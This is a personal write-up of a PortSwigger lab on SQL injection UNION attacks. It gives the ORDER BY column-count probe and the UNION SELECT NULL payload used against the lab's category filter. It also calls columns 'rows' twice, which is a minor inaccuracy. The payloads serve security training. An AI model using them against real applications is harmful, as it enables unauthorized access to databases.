# Lab: SQL injection UNION attack, determining the number of columns returned by the query
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

---

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 
---

### My solution:

I crafted and injected this payload to see how many rows are being returned by the original query:
`/filter?category=NULL' ORDER BY 1--` and I incremented 1 until I got an error.
I got an error at ORDER BY 4 so the original query returns 3 rows.

Then I crafted this payload to solve the lab:
`/filter?category=' UNION ALL SELECT NULL, NULL, NULL--`
